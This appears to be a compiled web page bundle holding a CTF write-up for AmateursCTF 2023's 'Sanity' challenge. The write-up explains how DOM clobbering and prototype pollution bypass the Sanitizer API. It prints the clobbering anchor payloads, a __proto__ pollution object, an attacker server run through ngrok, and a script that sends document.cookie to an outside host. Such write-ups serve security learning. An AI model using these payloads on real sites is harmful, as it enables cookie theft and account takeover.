#89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">extension</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">href</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://payload.shameerkashif.me</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,Zs,g,co,Xs,io,yo,Gs,Do,Eo,ql,Vs,Xe=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">&lt;a id="debug"&gt;&lt;/a&gt;&lt;a id="debug" name="extension" href="http://payload.shameerkashif.me"&gt;&lt;/a&gt;</span></div></code></div></pre>`,Ys,os,U,Ml,Z,es,vo,Rl,S,fo,Js,ho,uo,Wl,Ks,Ge=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> json</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">handle_request</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">request</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">    response </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">message</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Hello, world!</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    response_headers </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Access-Control-Allow-Origin</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">*</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span><span style="color: #89DDFF">.</span><span style="color: #F07178">SimpleHTTPRequestHandler</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">_set_headers</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">        request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> response</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> response_headers</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">server </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">HTTPServer</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">8000</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> handle_request</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">serve_forever</span><span style="color: #89DDFF">()</span></div><div class='line'></div></code></div></pre>`,Qs,ns,mo,Nl,sl,Ve=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 server.py</span></div><div class='line'><span style="color: undefined">ngrok http 8000</span></div></code></div></pre>`,ll,X,ps,wo,Ul,B,Ao,al,bo,go,Zl,ol,Ye=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__proto__</span><span style="color: #89DDFF">"</span><span style="color: #F07178">: </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">"</span><span style="color: #F07178">sanitize</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">false</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">"</span><span style="color: #F07178">report</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,el,m,_o,nl,Co,ko,pl,Po,xo,tl,Oo,To,Xl,Fl,Je=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__proto__</span><span style="color: #89DDFF">"</span><span style="color: #F07178">: </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">"</span><span style="color: #F07178">report</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,rl,ts,G,Gl,Fs,Io,Vl,V,rs,$o,Yl,L,zo,cl,jo,So,Jl,il,Ke=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">a</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">a</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">a</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">extension</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">href</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://payload.shameerkashif.me</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">a</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,yl,cs,Bo,Kl,Dl,Qe=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> json</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">handle_request</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">request</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">    response </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">      </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__proto__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">report</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> true</span></div><div class='line'><span style="color: #EEFFFF">      </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    response_headers </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Access-Control-Allow-Origin</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">*</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span><span style="color: #89DDFF">.</span><span style="color: #F07178">SimpleHTTPRequestHandler</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">_set_headers</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">        request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> response</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> response_headers</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">server </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">HTTPServer</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">8000</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> handle_request</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">serve_forever</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,dl,is,Lo,Ql,El,sn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span><span style="color: #82AAFF">fetch</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://ngrokurl/</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> document</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">cookie)</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,vl,ys,Ho,sa;return R=new ia({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/fbd6557c-4b5a-4955-8d12-f6e261f983e0",alt:"image"}}),N=new ia({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/6362e084-0a44-493c-9c0a-a6f9878f3283",alt:"image"}}),U=new ia({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/d1df6d24-3879-437a-b167-00d66f6c7345",alt:"image"}}),G=new ia({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/8128f783-7c66-479d-8b10-39989c5346a2",alt:"image"}}),{c(){D=t("h2"),u=t("a"),k=e("Introduction"),P=c(),y=t("p"),w=e("In the AmateursCTF 2023, there was a challenge by the name "),x=t("code"),ya=e("Sanity"),Da=e(". Now, i wasn’t able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. This challenge got me hooked up for quite some time."),bl=c(),q=t("h2"),J=t("a"),da=e("Surface"),gl=c(),d=t("p"),Ea=e("We were given 2 files: "),vs=t("code"),va=e("index.js"),fa=e(" and "),fs=t("code"),ha=e("sanes.ejs"),ua=e(". The former is ofcourse the execution file which we are going launch and the other file is being parsed on the way to show the input we are going to enter. The "),hs=t("code"),ma=e("index.js"),wa=e(" file was calling puppeteer which is a headless browser like selenium. The browser was visiting the server created by the script, attaching the cookie which contained the "),us=t("code"),Aa=e("flag"),ba=e(" and the visiting the sanes page created when we submitted the data. In index.js where the flag was being attached:"),_l=c(),ms=new v(!1),ws=c(),K=t("p"),ga=e("Moving towards the template file, the template was using sanitizer API. Lets review the template file first:"),Cl=c(),As=new v(!1),bs=c(),O=t("p"),_a=e("As we can see in the above code, we have an interesting line where the javascript was checking for "),gs=t("code"),Ca=e("debug.sanitize"),ka=e(" property and if its false, the data was passed without any sanitization. Moreover, if we move a little above from this statement, we find our actual target. The following code:"),kl=c(),_s=new v(!1),Cs=c(),T=t("p"),Pa=e("What exactly is happening here inside the if condition, the control is checking if the "),ks=t("code"),xa=e("debug.extension"),Oa=e(" parameter on windows object exists or not. If it does, fetch the value from URL and pass it to our next statement where we are passing the properties of 2 different javascript objects to another. There are 2 possible vulnerabilities that can be exploited here to gain XSS by bypassing the sanitizer API:"),Pl=c(),I=t("ul"),Ps=t("li"),Ta=e("DOM Clobbering"),Ia=c(),xs=t("li"),$a=e("Prototype Pollution"),xl=c(),M=t("h2"),Q=t("a"),za=e("Behind the Scenes"),Ol=c(),A=t("p"),ja=e("First things first, i normally work with Firefox but Sanitizer API gave me "),Os=t("code"),Sa=e("undefined"),Ba=e(" error. So, i moved to chrome considering that "),Ts=t("code"),La=e("puppeteer"),Ha=e(" also uses chromium."),Tl=c(),ss=t("p"),fl(R.$$.fragment),Il=c(),$=t("p"),qa=e("Before moving forward, i’d another problem in mind about the "),Is=t("code"),Ma=e("Debug"),Ra=e(" class. Inside the class we have:"),$l=c(),$s=new v(!1),zs=c(),b=t("p"),Wa=e("The class parameter initialized is a private member. The problem here is i can’t override the prameter value even with prototype pollution because its a private member. Neverthless, whats important is that default value is nothing and hence if during the exploitation, i would skip this parameter, then the "),js=t("code"),Na=e("debug.sanitize"),Ua=e(" should resolve to "),Ss=t("code"),Za=e("undefined"),Xa=e(" in the execution code condition. Well, now its a theory, so moving forward."),zl=c(),W=t("h3"),ls=t("a"),Ga=e("DOM Clobbering"),jl=c(),z=t("p"),Va=e("The milestone is to initialize a "),Bs=t("code"),Ya=e("debug"),Ja=e(" parameter on browser windows object."),Sl=c(),E=t("p"),Ka=e("With DOM Clobbering, if we give "),Ls=t("code"),Qa=e("id"),so=e(" to an element, the element is then initialized on browser’s "),Hs=t("code"),lo=e("window"),ao=e(" object. I started with a simple "),qs=t("code"),oo=e("div"),eo=e(" tag in the "),Ms=t("code"),no=e("Name Your Rant"),po=e(" field:"),Bl=c(),Rs=new v(!1),Ws=c(),as=t("p"),fl(N.$$.fragment),Ll=c(),j=t("p"),to=e("Good enough, we got the html element. But now how to get the "),Ns=t("code"),Fo=e("extension"),ro=e(" property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:"),Hl=c(),Us=new v(!1),Zs=c(),g=t("p"),co=e("If we are to use the "),Xs=t("code"),io=e("anchor"),yo=e(" tag instead of "),Gs=t("code"),Do=e("div"),Eo=e(" tag, we will get the URL in return. So, our first part would look like:"),ql=c(),Vs=new v(!1),Ys=c(),os=t("p"),fl(U.$$.fragment),Ml=c(),Z=t("h3"),es=t("a"),vo=e("Attacker Server"),Rl=c(),S=t("p"),fo=e("Here’s the code that i generated using "),Js=t("code"),ho=e("bard"),uo=e(":"),Wl=c(),Ks=new v(!1),Qs=c(),ns=t("p"),mo=e("Run the code and proxy it through ngrok:"),Nl=c(),sl=new v(!1),ll=c(),X=t("h3"),ps=t("a"),wo=e("Prototype Pollution"),Ul=c(),B=t("p"),Ao=e("With having control of the "),al=t("code"),bo=e("extension"),go=e(" variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind:"),Zl=c(),ol=new v(!1),el=c(),m=t("p"),_o=e("But as assumed very earlier, this gave me error as i can’t override the private member of Debug class. Well, the default value should be undefined when none provided for "),nl=t("code"),Co=e("get"),ko=e(" function. Because, you see the simple sanitize resolves to the "),pl=t("code"),Po=e("get"),xo=e(" function of the "),tl=t("code"),Oo=e("Debug"),To=e(". Since, we are overriding the prototype, we should leave it like this:"),Xl=c(),Fl=new v(!1),rl=c(),ts=t("p"),fl(G.$$.fragment),Gl=c(),Fs=t("p"),Io=e("And we got to this point as well."),Vl=c(),V=t("h4"),rs=t("a"),$o=e("Proof of Concept (POC)"),Yl=c(),L=t("p"),zo=e("Lets craft our final PoC. In the "),cl=t("code"),jo=e("name your rant"),So=e(" field we have:"),Jl=c(),il=new v(!1),yl=c(),cs=t("p"),Bo=e("And for our server, we would give the following payload:"),Kl=c(),Dl=new v(!1),dl=c(),is=t("p"),Lo=e("And finally in the paste section, lets put our final payload to steal the cookie:"),Ql=c(),El=new v(!1),vl=c(),ys=t("p"),Ho=e("And we get the flag in the server url. As said i wasn’t able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring."),this.h()},l(s){D=F(s,"H2",{id:!0});var o=r(D);u=F(o,"A",{href:!0});var Mo=r(u);k=n(Mo,"Introduction"),Mo.forEach(l),o.forEach(l),P=i(s),y=F(s,"P",{});var la=r(y);w=n(la,"In the AmateursCTF 2023, there was a challenge by the name "),x=F(la,"CODE",{});var Ro=r(x);ya=n(Ro,"Sanity"),Ro.forEach(l),Da=n(la,". Now, i wasn’t able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. This challenge got me hooked up for quite some time."),la.forEach(l),bl=i(s),q=F(s,"H2",{id:!0});var Wo=r(q);J=F(Wo,"A",{href:!0});var No=r(J);da=n(No,"Surface"),No.forEach(l),Wo.forEach(l),gl=i(s),d=F(s,"P",{});var _=r(d);Ea=n(_,"We were given 2 files: "),vs=F(_,"CODE",{});var Uo=r(vs);va=n(Uo,"index.js"),Uo.forEach(l),fa=n(_," and "),fs=F(_,"CODE",{});var Zo=r(fs);ha=n(Zo,"sanes.ejs"),Zo.forEach(l),ua=n(_,". The former is ofcourse the execution file which we are going launch and the other file is being parsed on the way to show the input we are going to enter. The "),hs=F(_,"CODE",{});var Xo=r(hs);ma=n(Xo,"index.js"),Xo.forEach(l),wa=n(_," file was calling puppeteer which is a headless browser like selenium. The browser was visiting the server created by the script, attaching the cookie which contained the "),us=F(_,"CODE",{});var Go=r(us);Aa=n(Go,"flag"),Go.forEach(l),ba=n(_," and the visiting the sanes page created when we submitted the data. In index.js where the flag was being attached:"),_.forEach(l),_l=i(s),ms=f(s,!1),ws=i(s),K=F(s,"P",{});var Vo=r(K);ga=n(Vo,"Moving towards the template file, the template was using sanitizer API. Lets review the template file first:"),Vo.forEach(l),Cl=i(s),As=f(s,!1),bs=i(s),O=F(s,"P",{});var aa=r(O);_a=n(aa,"As we can see in the above code, we have an interesting line where the javascript was checking for "),gs=F(aa,"CODE",{});var Yo=r(gs);Ca=n(Yo,"debug.sanitize"),Yo.forEach(l),ka=n(aa," property and if its false, the data was passed without any sanitization. Moreover, if we move a little above from this statement, we find our actual target. The following code:"),aa.forEach(l),kl=i(s),_s=f(s,!1),Cs=i(s),T=F(s,"P",{});var oa=r(T);Pa=n(oa,"What exactly is happening here inside the if condition, the control is checking if the "),ks=F(oa,"CODE",{});var Jo=r(ks);xa=n(Jo,"debug.extension"),Jo.forEach(l),Oa=n(oa," parameter on windows object exists or not. If it does, fetch the value from URL and pass it to our next statement where we are passing the properties of 2 different javascript objects to another. There are 2 possible vulnerabilities that can be exploited here to gain XSS by bypassing the sanitizer API:"),oa.forEach(l),Pl=i(s),I=F(s,"UL",{});var ea=r(I);Ps=F(ea,"LI",{});var Ko=r(Ps);Ta=n(Ko,"DOM Clobbering"),Ko.forEach(l),Ia=i(ea),xs=F(ea,"LI",{});var Qo=r(xs);$a=n(Qo,"Prototype Pollution"),Qo.forEach(l),ea.forEach(l),xl=i(s),M=F(s,"H2",{id:!0});var se=r(M);Q=F(se,"A",{href:!0});var le=r(Q);za=n(le,"Behind the Scenes"),le.forEach(l),se.forEach(l),Ol=i(s),A=F(s,"P",{});var Ds=r(A);ja=n(Ds,"First things first, i normally work with Firefox but Sanitizer API gave me "),Os=F(Ds,"CODE",{});var ae=r(Os);Sa=n(ae,"undefined"),ae.forEach(l),Ba=n(Ds," error. So, i moved to chrome considering that "),Ts=F(Ds,"CODE",{});var oe=r(Ts);La=n(oe,"puppeteer"),oe.forEach(l),Ha=n(Ds," also uses chromium."),Ds.forEach(l),Tl=i(s),ss=F(s,"P",{});var ee=r(ss);hl(R.$$.fragment,ee),ee.forEach(l),Il=i(s),$=F(s,"P",{});var na=r($);qa=n(na,"Before moving forward, i’d another problem in mind about the "),Is=F(na,"CODE",{});var ne=r(Is);Ma=n(ne,"Debug"),ne.forEach(l),Ra=n(na," class. Inside the class we have:"),na.forEach(l),$l=i(s),$s=f(s,!1),zs=i(s),b=F(s,"P",{});var ds=r(b);Wa=n(ds,"The class parameter initialized is a private member. The problem here is i can’t override the prameter value even with prototype pollution because its a private member. Neverthless, whats important is that default value is nothing and hence if during the exploitation, i would skip this parameter, then the "),js=F(ds,"CODE",{});var pe=r(js);Na=n(pe,"debug.sanitize"),pe.forEach(l),Ua=n(ds," should resolve to "),Ss=F(ds,"CODE",{});var te=r(Ss);Za=n(te,"undefined"),te.forEach(l),Xa=n(ds," in the execution code condition. Well, now its a theory, so moving forward."),ds.forEach(l),zl=i(s),W=F(s,"H3",{id:!0});var Fe=r(W);ls=F(Fe,"A",{href:!0});var re=r(ls);Ga=n(re,"DOM Clobbering"),re.forEach(l),Fe.forEach(l),jl=i(s),z=F(s,"P",{});var pa=r(z);Va=n(pa,"The milestone is to initialize a "),Bs=F(pa,"CODE",{});var ce=r(Bs);Ya=n(ce,"debug"),ce.forEach(l),Ja=n(pa," parameter on browser windows object."),pa.forEach(l),Sl=i(s),E=F(s,"P",{});var C=r(E);Ka=n(C,"With DOM Clobbering, if we give "),Ls=F(C,"CODE",{});var ie=r(Ls);Qa=n(ie,"id"),ie.forEach(l),so=n(C," to an element, the element is then initialized on browser’s "),Hs=F(C,"CODE",{});var ye=r(Hs);lo=n(ye,"window"),ye.forEach(l),ao=n(C," object. I started with a simple "),qs=F(C,"CODE",{});var De=r(qs);oo=n(De,"div"),De.forEach(l),eo=n(C," tag in the "),Ms=F(C,"CODE",{});var de=r(Ms);no=n(de,"Name Your Rant"),de.forEach(l),po=n(C," field:"),C.forEach(l),Bl=i(s),Rs=f(s,!1),Ws=i(s),as=F(s,"P",{});var Ee=r(as);hl(N.$$.fragment,Ee),Ee.forEach(l),Ll=i(s),j=F(s,"P",{});var ta=r(j);to=n(ta,"Good enough, we got the html element. But now how to get the "),Ns=F(ta,"CODE",{});var ve=r(Ns);Fo=n(ve,"extension"),ve.forEach(l),ro=n(ta," property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:"),ta.forEach(l),Hl=i(s),Us=f(s,!1),Zs=i(s),g=F(s,"P",{});var Es=r(g);co=n(Es,"If we are to use the "),Xs=F(Es,"CODE",{});var fe=r(Xs);io=n(fe,"anchor"),fe.forEach(l),yo=n(Es," tag instead of "),Gs=F(Es,"CODE",{});var he=r(Gs);Do=n(he,"div"),he.forEach(l),Eo=n(Es," tag, we will get the URL in return. So, our first part would look like:"),Es.forEach(l),ql=i(s),Vs=f(s,!1),Ys=i(s),os=F(s,"P",{});var ue=r(os);hl(U.$$.fragment,ue),ue.forEach(l),Ml=i(s),Z=F(s,"H3",{id:!0});var me=r(Z);es=F(me,"A",{href:!0});var we=r(es);vo=n(we,"Attacker Server"),we.forEach(l),me.forEach(l),Rl=i(s),S=F(s,"P",{});var Fa=r(S);fo=n(Fa,"Here’s the code that i generated using "),Js=F(Fa,"CODE",{});var Ae=r(Js);ho=n(Ae,"bard"),Ae.forEach(l),uo=n(Fa,":"),Fa.forEach(l),Wl=i(s),Ks=f(s,!1),Qs=i(s),ns=F(s,"P",{});var be=r(ns);mo=n(be,"Run the code and proxy it through ngrok:"),be.forEach(l),Nl=i(s),sl=f(s,!1),ll=i(s),X=F(s,"H3",{id:!0});var ge=r(X);ps=F(ge,"A",{href:!0});var _e=r(ps);wo=n(_e,"Prototype Pollution"),_e.forEach(l),ge.forEach(l),Ul=i(s),B=F(s,"P",{});var ra=r(B);Ao=n(ra,"With having control of the "),al=F(ra,"CODE",{});var Ce=r(al);bo=n(Ce,"extension"),Ce.forEach(l),go=n(ra," variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind:"),ra.forEach(l),Zl=i(s),ol=f(s,!1),el=i(s),m=F(s,"P",{});var H=r(m);_o=n(H,"But as assumed very earlier, this gave me error as i can’t override the private member of Debug class. Well, the default value should be undefined when none provided for "),nl=F(H,"CODE",{});var ke=r(nl);Co=n(ke,"get"),ke.forEach(l),ko=n(H," function. Because, you see the simple sanitize resolves to the "),pl=F(H,"CODE",{});var Pe=r(pl);Po=n(Pe,"get"),Pe.forEach(l),xo=n(H," function of the "),tl=F(H,"CODE",{});var xe=r(tl);Oo=n(xe,"Debug"),xe.forEach(l),To=n(H,". Since, we are overriding the prototype, we should leave it like this:"),H.forEach(l),Xl=i(s),Fl=f(s,!1),rl=i(s),ts=F(s,"P",{});var Oe=r(ts);hl(G.$$.fragment,Oe),Oe.forEach(l),Gl=i(s),Fs=F(s,"P",{});var Te=r(Fs);Io=n(Te,"And we got to this point as well."),Te.forEach(l),Vl=i(s),V=F(s,"H4",{id:!0});var Ie=r(V);rs=F(Ie,"A",{href:!0});var $e=r(rs);$o=n($e,"Proof of Concept (POC)"),$e.forEach(l),Ie.forEach(l),Yl=i(s),L=F(s,"P",{});var ca=r(L);zo=n(ca,"Lets craft our final PoC. In the "),cl=F(ca,"CODE",{});var ze=r(cl);jo=n(ze,"name your rant"),ze.forEach(l),So=n(ca," field we have:"),ca.forEach(l),Jl=i(s),il=f(s,!1),yl=i(s),cs=F(s,"P",{});var je=r(cs);Bo=n(je,"And for our server, we would give the following payload:"),je.forEach(l),Kl=i(s),Dl=f(s,!1),dl=i(s),is=F(s,"P",{});var Se=r(is);Lo=n(Se,"And finally in the paste section, lets put our final payload to steal the cookie:"),Se.forEach(l),Ql=i(s),El=f(s,!1),vl=i(s),ys=F(s,"P",{});var Be=r(ys);Ho=n(Be,"And we get the flag in the server url. As said i wasn’t able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring."),Be.forEach(l),this.h()},h(){h(u,"href","#introduction"),h(D,"id","introduction"),h(J,"href","#surface"),h(q,"id","surface"),ms.a=ws,As.a=bs,_s.a=Cs,h(Q,"href","#behind-the-scenes"),h(M,"id","behind-the-scenes"),$s.a=zs,h(ls,"href","#dom-clobbering"),h(W,"id","dom-clobbering"),Rs.a=Ws,Us.a=Zs,Vs.a=Ys,h(es,"href","#attacker-server"),h(Z,"id","attacker-server"),Ks.a=Qs,sl.a=ll,h(ps,"href","#prototype-pollution"),h(X,"id","prototype-pollution"),ol.a=el,Fl.a=rl,h(rs,"href","#proof-of-concept-poc"),h(V,"id","proof-of-concept-poc"),il.a=yl,Dl.a=dl,El.a=vl},m(s,o){p(s,D,o),a(D,u),a(u,k),p(s,P,o),p(s,y,o),a(y,w),a(y,x),a(x,ya),a(y,Da),p(s,bl,o),p(s,q,o),a(q,J),a(J,da),p(s,gl,o),p(s,d,o),a(d,Ea),a(d,vs),a(vs,va),a(d,fa),a(d,fs),a(fs,ha),a(d,ua),a(d,hs),a(hs,ma),a(d,wa),a(d,us),a(us,Aa),a(d,ba),p(s,_l,o),ms.m(Me,s,o),p(s,ws,o),p(s,K,o),a(K,ga),p(s,Cl,o),As.m(Re,s,o),p(s,bs,o),p(s,O,o),a(O,_a),a(O,gs),a(gs,Ca),a(O,ka),p(s,kl,o),_s.m(We,s,o),p(s,Cs,o),p(s,T,o),a(T,Pa),a(T,ks),a(ks,xa),a(T,Oa),p(s,Pl,o),p(s,I,o),a(I,Ps),a(Ps,Ta),a(I,Ia),a(I,xs),a(xs,$a),p(s,xl,o),p(s,M,o),a(M,Q),a(Q,za),p(s,Ol,o),p(s,A,o),a(A,ja),a(A,Os),a(Os,Sa),a(A,Ba),a(A,Ts),a(Ts,La),a(A,Ha),p(s,Tl,o),p(s,ss,o),ul(R,ss,null),p(s,Il,o),p(s,$,o),a($,qa),a($,Is),a(Is,Ma),a($,Ra),p(s,$l,o),$s.m(Ne,s,o),p(s,zs,o),p(s,b,o),a(b,Wa),a(b,js),a(js,Na),a(b,Ua),a(b,Ss),a(Ss,Za),a(b,Xa),p(